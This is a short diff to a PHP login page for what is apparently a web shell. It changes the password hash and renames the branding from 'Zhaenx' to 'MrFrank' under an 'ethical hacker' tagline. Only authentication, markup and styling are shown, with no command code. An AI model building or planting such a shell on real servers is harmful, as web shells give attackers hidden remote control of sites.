@@ -3,7 +3,7 @@
 ob_start();
 session_start();
 
-$hash = '$2b$16$h2jZzx2uFpRx2DYTHRs1g.QVBorfCcvRMGVcUJi4ciKhLhKajQqj';
+$hash = '$2b$16$oC.Jeu1oziYB1/QF7ATPOOXI3vcDEmTian4KLgjqNot0BLZjaz8.S';
 
 if (!isset($_SESSION['auth'])) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass']) && password_verify($_POST['pass'], $hash)) {
@@ -16,7 +16,7 @@ if (!isset($_SESSION['auth'])) {
 <html>
 
    <head>
-      <title>Login - Zhaenx Shell</title>
+      <title>Login - MrFrank Shell</title>
       <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-4Q6Gf2aSP4eDXB8Miphtr37CMZZQ5oXLH2yaXMJ2w8e2ZtHTl7GptT4jmndRuHDT" crossorigin="anonymous" />
       <link rel="preconnect" href="https://fonts.googleapis.com" />
@@ -46,7 +46,7 @@ if (!isset($_SESSION['auth'])) {
          line-height: 1;
       }
 
-      .zxform-controlInput,
+      .zxform-controlInput,   
       .zxform-controlInput:focus {
          background: rgb(0, 0, 0);
          color: #9fef00;
@@ -300,7 +300,7 @@ if (isset($_GET['logout'])) {
                </div>
 
                <div class="col-lg-12 mb-3 user-select-none">
-                  <h1 class="mb-4">ZH43NX - WebShell
+                  <h1 class="mb-4">MRFRANK - WebShell
                      <p>(Ethical Hacker - Web Penetrations Testing)</p>
                   </h1>
                </div>
